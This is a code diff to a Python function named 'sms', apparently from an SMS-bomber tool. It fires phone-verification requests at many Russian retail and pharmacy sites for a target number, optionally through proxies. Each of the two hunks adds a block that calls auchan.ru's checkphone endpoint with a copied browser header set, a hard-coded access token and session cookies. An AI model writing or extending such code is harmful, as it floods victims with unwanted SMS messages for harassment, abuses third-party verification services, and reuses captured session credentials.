@@ -731,6 +731,32 @@ def sms(prx, number, tm, code):
 				except:
 					pass
 
+				try:
+					header = {
+						"Accept": "application/json, text/plain, */*",
+						"Accept-Encoding": "gzip, deflate, br",
+						"Accept-Language": "en-US,en;q=0.9",
+						"access_token": "eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI2OTZjMWI5Zi0xZzQ1LTQ1OWEtYmVhNC0xMTEwNjhmYWNkYTgiLCJpYXQiOjE2NDI2NTAzMDYsInN1YiI6ImNoZWNrbWFpbF91c2VyIiwibGV2ZWwiOjIwLCJpc3MiOiJBdWNoYW4ucnUiLCJleHAiOjE2NDY2NTAzMDZ9.43AZQ1iu8nij9cOHGKhyXj90vs760jRgZ0fgMiGr4jk",
+						"Connection": "keep-alive",
+						"Cookie": 'qrator_ssid=1642649765.095.fttk4T3mxYyqmPcM-ih087q38reubv5cso9vgt2m9a59ckhtc; isAddressPopupShown_=true; animationSort=0; region_id=1; merchant_ID_=1; methodDelivery_=1; _GASHOP=001_Mitishchi; rrpvid=672868630906584; _ms=a51e246a-4388-4ebb-9f24-1e2568234932; qrator_jsid=1642649763.483.MlRbGqzjhF9rXc3G-fkesl3itieqdnqfj8vo0bnsjtgdikmf0; device_id=471374589018.96954',
+						"dnt": "1",
+						"Host": "www.auchan.ru",
+						"phone": number,
+						"Referer": "https://www.auchan.ru/auth/",
+						"sec-ch-ua": '"Chromium";v="96", "Opera GX";v="82", ";Not A Brand";v="99"',
+						"sec-ch-ua-mobile": "?0",
+						"sec-ch-ua-platform": "Windows",
+						"Sec-fetch-dest": "empty",
+						"Sec-fetch-mode": "cors",
+						"Sec-fetch-site": "same-origin",
+						"sec-gpc": "1",
+						"source": "4",
+						"User-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)"
+					}
+					requests.get("https://www.auchan.ru/v1/cmd/clientprofile/checkphone", headers=header, proxies = proxies)
+				except:
+					pass
+
 				try:			
 					requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{number}/", headers=header, proxies = proxies)
 				except:
@@ -1004,6 +1030,32 @@ def sms(prx, number, tm, code):
 						"typeAction": "regUser"
 					}
 					requests.post("https://zdravcity.ru/ajax/sendcode.php", data=payload)
+				except:
+					pass
+
+				try:
+					header = {
+						"Accept": "application/json, text/plain, */*",
+						"Accept-Encoding": "gzip, deflate, br",
+						"Accept-Language": "en-US,en;q=0.9",
+						"access_token": "eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI2OTZjMWI5Zi0xZzQ1LTQ1OWEtYmVhNC0xMTEwNjhmYWNkYTgiLCJpYXQiOjE2NDI2NTAzMDYsInN1YiI6ImNoZWNrbWFpbF91c2VyIiwibGV2ZWwiOjIwLCJpc3MiOiJBdWNoYW4ucnUiLCJleHAiOjE2NDY2NTAzMDZ9.43AZQ1iu8nij9cOHGKhyXj90vs760jRgZ0fgMiGr4jk",
+						"Connection": "keep-alive",
+						"Cookie": 'qrator_ssid=1642649765.095.fttk4T3mxYyqmPcM-ih087q38reubv5cso9vgt2m9a59ckhtc; isAddressPopupShown_=true; animationSort=0; region_id=1; merchant_ID_=1; methodDelivery_=1; _GASHOP=001_Mitishchi; rrpvid=672868630906584; _ms=a51e246a-4388-4ebb-9f24-1e2568234932; qrator_jsid=1642649763.483.MlRbGqzjhF9rXc3G-fkesl3itieqdnqfj8vo0bnsjtgdikmf0; device_id=471374589018.96954',
+						"dnt": "1",
+						"Host": "www.auchan.ru",
+						"phone": number,
+						"Referer": "https://www.auchan.ru/auth/",
+						"sec-ch-ua": '"Chromium";v="96", "Opera GX";v="82", ";Not A Brand";v="99"',
+						"sec-ch-ua-mobile": "?0",
+						"sec-ch-ua-platform": "Windows",
+						"Sec-fetch-dest": "empty",
+						"Sec-fetch-mode": "cors",
+						"Sec-fetch-site": "same-origin",
+						"sec-gpc": "1",
+						"source": "4",
+						"User-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)"
+					}
+					requests.get("https://www.auchan.ru/v1/cmd/clientprofile/checkphone", headers=header)
 				except:
 					pass
 
